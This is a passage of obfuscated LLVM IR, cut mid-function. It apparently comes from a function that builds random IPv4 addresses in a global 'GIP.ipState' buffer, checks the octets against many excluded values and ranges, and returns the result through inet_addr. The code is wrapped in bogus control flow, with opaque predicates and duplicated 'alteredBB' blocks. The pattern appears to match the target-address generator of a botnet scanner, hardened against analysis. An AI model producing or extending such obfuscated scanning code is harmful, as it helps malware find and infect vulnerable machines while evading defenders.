  %5300 = load i32, i32* @x.65
  %5301 = load i32, i32* @y.66
  %5302 = sub i32 %5300, 1
  %5303 = mul i32 %5300, %5302
  %5304 = urem i32 %5303, 2
  %5305 = icmp eq i32 %5304, 0
  %5306 = icmp slt i32 %5301, 10
  %5307 = or i1 %5305, %5306
  br i1 %5307, label %originalBB742, label %originalBB742alteredBB

originalBB742:                                    ; preds = %originalBB742alteredBB, %5298
  %5308 = load i32, i32* @x.65
  %5309 = load i32, i32* @y.66
  %5310 = sub i32 %5308, 1
  %5311 = mul i32 %5308, %5310
  %5312 = urem i32 %5311, 2
  %5313 = icmp eq i32 %5312, 0
  %5314 = icmp slt i32 %5309, 10
  %5315 = or i1 %5313, %5314
  br i1 %5315, label %originalBBpart2744, label %originalBB742alteredBB

originalBBpart2744:                               ; preds = %originalBB742
  br i1 %5299, label %5316, label %5329

; <label>:5316:                                   ; preds = %originalBBpart2744
  %5317 = call i32 @rand() #3
  %5318 = srem i32 %5317, 223
  %5319 = trunc i32 %5318 to i8
  store i8 %5319, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5320 = call i32 @rand() #3
  %5321 = srem i32 %5320, 255
  %5322 = trunc i32 %5321 to i8
  store i8 %5322, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5323 = call i32 @rand() #3
  %5324 = srem i32 %5323, 255
  %5325 = trunc i32 %5324 to i8
  store i8 %5325, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5326 = call i32 @rand() #3
  %5327 = srem i32 %5326, 255
  %5328 = trunc i32 %5327 to i8
  store i8 %5328, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:5329:                                   ; preds = %originalBBpart2744
  %5330 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5330, i8 0, i64 16, i32 16, i1 false)
  %5331 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %5332 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5333 = zext i8 %5332 to i32
  %5334 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5335 = zext i8 %5334 to i32
  %5336 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5337 = zext i8 %5336 to i32
  %5338 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 3), align 1
  %5339 = zext i8 %5338 to i32
  %5340 = call i32 (i8*, i8*, ...) @szprintf(i8* %5331, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.99, i32 0, i32 0), i32 %5333, i32 %5335, i32 %5337, i32 %5339)
  %5341 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %5342 = call i32 @inet_addr(i8* %5341) #3
  ret i32 %5342

originalBBalteredBB:                              ; preds = %originalBB, %38
  %5343 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5344 = zext i8 %5343 to i32
  %5345 = icmp eq i32 %5344, 25
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %74
  %5346 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5347 = zext i8 %5346 to i32
  %5348 = icmp eq i32 %5347, 7
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %94
  %5349 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5350 = zext i8 %5349 to i32
  %5351 = icmp eq i32 %5350, 11
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %126
  %5352 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5353 = zext i8 %5352 to i32
  %5354 = icmp eq i32 %5353, 28
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %150
  %5355 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5356 = zext i8 %5355 to i32
  %5357 = icmp eq i32 %5356, 30
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %198
  %5358 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5359 = zext i8 %5358 to i32
  %5360 = icmp eq i32 %5359, 17
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %226
  %5361 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5362 = zext i8 %5361 to i32
  %5363 = icmp eq i32 %5362, 146
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %258
  %5364 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5365 = zext i8 %5364 to i32
  %5366 = icmp eq i32 %5365, 147
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %310
  %5367 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5368 = zext i8 %5367 to i32
  %5369 = icmp eq i32 %5368, 144
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %334
  %5370 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5371 = zext i8 %5370 to i32
  %5372 = icmp eq i32 %5371, 149
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %374
  %5373 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5374 = zext i8 %5373 to i32
  %5375 = icmp eq i32 %5374, 190
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %406
  %5376 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5377 = zext i8 %5376 to i32
  %5378 = icmp eq i32 %5377, 82
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %434
  %5379 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5380 = zext i8 %5379 to i32
  %5381 = icmp eq i32 %5380, 157
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %454
  %5382 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5383 = zext i8 %5382 to i32
  %5384 = icmp eq i32 %5383, 202
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %478
  %5385 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5386 = zext i8 %5385 to i32
  %5387 = icmp eq i32 %5386, 217
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %502
  %5388 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5389 = zext i8 %5388 to i32
  %5390 = icmp eq i32 %5389, 124
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %534
  %5391 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5392 = zext i8 %5391 to i32
  %5393 = icmp eq i32 %5392, 96
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %554
  %5394 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5395 = zext i8 %5394 to i32
  %5396 = icmp eq i32 %5395, 155
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %586
  %5397 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5398 = zext i8 %5397 to i32
  %5399 = icmp eq i32 %5398, 155
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %610
  %5400 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5401 = zext i8 %5400 to i32
  %5402 = icmp eq i32 %5401, 164
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %634
  %5403 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5404 = zext i8 %5403 to i32
  %5405 = icmp eq i32 %5404, 156
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %658
  %5406 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5407 = zext i8 %5406 to i32
  %5408 = icmp eq i32 %5407, 167
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %678
  %5409 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5410 = zext i8 %5409 to i32
  %5411 = icmp eq i32 %5410, 44
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %710
  %5412 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5413 = zext i8 %5412 to i32
  %5414 = icmp eq i32 %5413, 85
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %738
  %5415 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5416 = zext i8 %5415 to i32
  %5417 = icmp eq i32 %5416, 203
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %762
  %5418 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5419 = zext i8 %5418 to i32
  %5420 = icmp eq i32 %5419, 204
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %790
  %5421 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5422 = zext i8 %5421 to i32
  %5423 = icmp eq i32 %5422, 30
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %818
  %5424 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5425 = zext i8 %5424 to i32
  %5426 = icmp eq i32 %5425, 117
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %850
  %5427 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5428 = zext i8 %5427 to i32
  %5429 = icmp eq i32 %5428, 207
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %890
  %5430 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5431 = zext i8 %5430 to i32
  %5432 = icmp eq i32 %5431, 172
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %910
  %5433 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5434 = zext i8 %5433 to i32
  %5435 = icmp sge i32 %5434, 16
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %938
  %5436 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5437 = zext i8 %5436 to i32
  %5438 = icmp sge i32 %5437, 64
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %966
  %5439 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5440 = zext i8 %5439 to i32
  %5441 = icmp eq i32 %5440, 254
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %990
  %5442 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5443 = zext i8 %5442 to i32
  %5444 = icmp sge i32 %5443, 18
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1010
  %5445 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5446 = zext i8 %5445 to i32
  %5447 = icmp slt i32 %5446, 20
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1034
  %5448 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5449 = zext i8 %5448 to i32
  %5450 = icmp sge i32 %5449, 69
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1054
  %5451 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5452 = zext i8 %5451 to i32
  %5453 = icmp slt i32 %5452, 227
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1074
  %5454 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5455 = zext i8 %5454 to i32
  %5456 = icmp eq i32 %5455, 128
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1094
  %5457 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5458 = zext i8 %5457 to i32
  %5459 = icmp sge i32 %5458, 35
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1114
  %5460 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5461 = zext i8 %5460 to i32
  %5462 = icmp slt i32 %5461, 237
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1134
  %5463 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5464 = zext i8 %5463 to i32
  %5465 = icmp eq i32 %5464, 129
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %1182
  %5466 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5467 = zext i8 %5466 to i32
  %5468 = icmp slt i32 %5467, 251
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %1202
  %5469 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5470 = zext i8 %5469 to i32
  %5471 = icmp eq i32 %5470, 132
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %1234
  %5472 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5473 = zext i8 %5472 to i32
  %5474 = icmp sge i32 %5473, 5
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %1266
  %5475 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5476 = zext i8 %5475 to i32
  %5477 = icmp slt i32 %5476, 223
  br label %originalBB174

originalBB178alteredBB:                           ; preds = %originalBB178, %1294
  %5478 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5479 = zext i8 %5478 to i32
  %5480 = icmp slt i32 %5479, 194
  br label %originalBB178

originalBB182alteredBB:                           ; preds = %originalBB182, %1330
  %5481 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5482 = zext i8 %5481 to i32
  %5483 = icmp sge i32 %5482, 1
  br label %originalBB182

originalBB186alteredBB:                           ; preds = %originalBB186, %1354
  %5484 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5485 = zext i8 %5484 to i32
  %5486 = icmp eq i32 %5485, 143
  br label %originalBB186

originalBB190alteredBB:                           ; preds = %originalBB190, %1378
  %5487 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5488 = zext i8 %5487 to i32
  %5489 = icmp slt i32 %5488, 233
  br label %originalBB190

originalBB194alteredBB:                           ; preds = %originalBB194, %1410
  %5490 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5491 = zext i8 %5490 to i32
  %5492 = icmp eq i32 %5491, 146
  br label %originalBB194

originalBB198alteredBB:                           ; preds = %originalBB198, %1430
  %5493 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5494 = zext i8 %5493 to i32
  %5495 = icmp sge i32 %5494, 165
  br label %originalBB198

originalBB202alteredBB:                           ; preds = %originalBB202, %1454
  %5496 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5497 = zext i8 %5496 to i32
  %5498 = icmp eq i32 %5497, 147
  br label %originalBB202

originalBB206alteredBB:                           ; preds = %originalBB206, %1482
  %5499 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5500 = zext i8 %5499 to i32
  %5501 = icmp eq i32 %5500, 147
  br label %originalBB206

originalBB210alteredBB:                           ; preds = %originalBB210, %1518
  %5502 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5503 = zext i8 %5502 to i32
  %5504 = icmp slt i32 %5503, 170
  br label %originalBB210

originalBB214alteredBB:                           ; preds = %originalBB214, %1550
  %5505 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5506 = zext i8 %5505 to i32
  %5507 = icmp eq i32 %5506, 147
  br label %originalBB214

originalBB218alteredBB:                           ; preds = %originalBB218, %1574
  %5508 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5509 = zext i8 %5508 to i32
  %5510 = icmp slt i32 %5509, 255
  br label %originalBB218

originalBB222alteredBB:                           ; preds = %originalBB222, %1602
  %5511 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5512 = zext i8 %5511 to i32
  %5513 = icmp slt i32 %5512, 115
  br label %originalBB222

originalBB226alteredBB:                           ; preds = %originalBB226, %1638
  %5514 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5515 = zext i8 %5514 to i32
  %5516 = icmp sge i32 %5515, 21
  br label %originalBB226

originalBB230alteredBB:                           ; preds = %originalBB230, %1674
  %5517 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5518 = zext i8 %5517 to i32
  %5519 = icmp eq i32 %5518, 155
  br label %originalBB230

originalBB234alteredBB:                           ; preds = %originalBB234, %1694
  %5520 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5521 = zext i8 %5520 to i32
  %5522 = icmp sge i32 %5521, 74
  br label %originalBB234

originalBB238alteredBB:                           ; preds = %originalBB238, %1714
  %5523 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5524 = zext i8 %5523 to i32
  %5525 = icmp slt i32 %5524, 89
  br label %originalBB238

originalBB242alteredBB:                           ; preds = %originalBB242, %1734
  %5526 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5527 = zext i8 %5526 to i32
  %5528 = icmp eq i32 %5527, 155
  br label %originalBB242

originalBB246alteredBB:                           ; preds = %originalBB246, %1758
  %5529 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5530 = zext i8 %5529 to i32
  %5531 = icmp slt i32 %5530, 222
  br label %originalBB246

originalBB250alteredBB:                           ; preds = %originalBB250, %1786
  %5532 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5533 = zext i8 %5532 to i32
  %5534 = icmp slt i32 %5533, 154
  br label %originalBB250

originalBB254alteredBB:                           ; preds = %originalBB254, %1814
  %5535 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5536 = zext i8 %5535 to i32
  %5537 = icmp slt i32 %5536, 21
  br label %originalBB254

originalBB258alteredBB:                           ; preds = %originalBB258, %1862
  %5538 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5539 = zext i8 %5538 to i32
  %5540 = icmp sge i32 %5539, 132
  br label %originalBB258

originalBB262alteredBB:                           ; preds = %originalBB262, %1886
  %5541 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5542 = zext i8 %5541 to i32
  %5543 = icmp eq i32 %5542, 64
  br label %originalBB262

originalBB266alteredBB:                           ; preds = %originalBB266, %1918
  %5544 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5545 = zext i8 %5544 to i32
  %5546 = icmp sge i32 %5545, 45
  br label %originalBB266

originalBB270alteredBB:                           ; preds = %originalBB270, %1942
  %5547 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5548 = zext i8 %5547 to i32
  %5549 = icmp eq i32 %5548, 163
  br label %originalBB270

originalBB274alteredBB:                           ; preds = %originalBB274, %1970
  %5550 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5551 = zext i8 %5550 to i32
  %5552 = icmp eq i32 %5551, 164
  br label %originalBB274

originalBB278alteredBB:                           ; preds = %originalBB278, %2006
  %5553 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5554 = zext i8 %5553 to i32
  %5555 = icmp slt i32 %5554, 233
  br label %originalBB278

originalBB282alteredBB:                           ; preds = %originalBB282, %2026
  %5556 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5557 = zext i8 %5556 to i32
  %5558 = icmp eq i32 %5557, 169
  br label %originalBB282

originalBB286alteredBB:                           ; preds = %originalBB286, %2062
  %5559 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5560 = zext i8 %5559 to i32
  %5561 = icmp slt i32 %5560, 254
  br label %originalBB286

originalBB290alteredBB:                           ; preds = %originalBB290, %2102
  %5562 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5563 = zext i8 %5562 to i32
  %5564 = icmp slt i32 %5563, 62
  br label %originalBB290

originalBB294alteredBB:                           ; preds = %originalBB294, %2158
  %5565 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5566 = zext i8 %5565 to i32
  %5567 = icmp eq i32 %5566, 162
  br label %originalBB294

originalBB298alteredBB:                           ; preds = %originalBB298, %2198
  %5568 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5569 = zext i8 %5568 to i32
  %5570 = icmp eq i32 %5569, 104
  br label %originalBB298

originalBB302alteredBB:                           ; preds = %originalBB302, %2226
  %5571 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5572 = zext i8 %5571 to i32
  %5573 = icmp eq i32 %5572, 236
  br label %originalBB302

originalBB306alteredBB:                           ; preds = %originalBB306, %2262
  %5574 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5575 = zext i8 %5574 to i32
  %5576 = icmp eq i32 %5575, 138
  br label %originalBB306

originalBB310alteredBB:                           ; preds = %originalBB310, %2294
  %5577 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5578 = zext i8 %5577 to i32
  %5579 = icmp eq i32 %5578, 146
  br label %originalBB310

originalBB314alteredBB:                           ; preds = %originalBB314, %2314
  %5580 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5581 = zext i8 %5580 to i32
  %5582 = icmp eq i32 %5581, 185
  br label %originalBB314

originalBB318alteredBB:                           ; preds = %originalBB318, %2334
  %5583 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5584 = zext i8 %5583 to i32
  %5585 = icmp sge i32 %5584, 128
  br label %originalBB318

originalBB322alteredBB:                           ; preds = %originalBB322, %2374
  %5586 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5587 = zext i8 %5586 to i32
  %5588 = icmp eq i32 %5587, 174
  br label %originalBB322

originalBB326alteredBB:                           ; preds = %originalBB326, %2402
  %5589 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5590 = zext i8 %5589 to i32
  %5591 = icmp slt i32 %5590, 127
  br label %originalBB326

originalBB330alteredBB:                           ; preds = %originalBB330, %2422
  %5592 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5593 = zext i8 %5592 to i32
  %5594 = icmp eq i32 %5593, 192
  br label %originalBB330

originalBB334alteredBB:                           ; preds = %originalBB334, %2458
  %5595 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5596 = zext i8 %5595 to i32
  %5597 = icmp eq i32 %5596, 199
  br label %originalBB334

originalBB338alteredBB:                           ; preds = %originalBB338, %2486
  %5598 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5599 = zext i8 %5598 to i32
  %5600 = icmp eq i32 %5599, 198
  br label %originalBB338

originalBB342alteredBB:                           ; preds = %originalBB342, %2518
  %5601 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5602 = zext i8 %5601 to i32
  %5603 = icmp eq i32 %5602, 207
  br label %originalBB342

originalBB346alteredBB:                           ; preds = %originalBB346, %2538
  %5604 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5605 = zext i8 %5604 to i32
  %5606 = icmp eq i32 %5605, 154
  br label %originalBB346

originalBB350alteredBB:                           ; preds = %originalBB350, %2566
  %5607 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5608 = zext i8 %5607 to i32
  %5609 = icmp eq i32 %5608, 37
  br label %originalBB350

originalBB354alteredBB:                           ; preds = %originalBB354, %2590
  %5610 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5611 = zext i8 %5610 to i32
  %5612 = icmp sge i32 %5611, 1
  br label %originalBB354

originalBB358alteredBB:                           ; preds = %originalBB358, %2614
  %5613 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5614 = zext i8 %5613 to i32
  %5615 = icmp eq i32 %5614, 67
  br label %originalBB358

originalBB362alteredBB:                           ; preds = %originalBB362, %2638
  %5616 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5617 = zext i8 %5616 to i32
  %5618 = icmp sge i32 %5617, 64
  br label %originalBB362

originalBB366alteredBB:                           ; preds = %originalBB366, %2658
  %5619 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5620 = zext i8 %5619 to i32
  %5621 = icmp slt i32 %5620, 95
  br label %originalBB366

originalBB370alteredBB:                           ; preds = %originalBB370, %2678
  %5622 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5623 = zext i8 %5622 to i32
  %5624 = icmp eq i32 %5623, 67
  br label %originalBB370

originalBB374alteredBB:                           ; preds = %originalBB374, %2698
  %5625 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5626 = zext i8 %5625 to i32
  %5627 = icmp eq i32 %5626, 205
  br label %originalBB374

originalBB378alteredBB:                           ; preds = %originalBB378, %2726
  %5628 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5629 = zext i8 %5628 to i32
  %5630 = icmp eq i32 %5629, 80
  br label %originalBB378

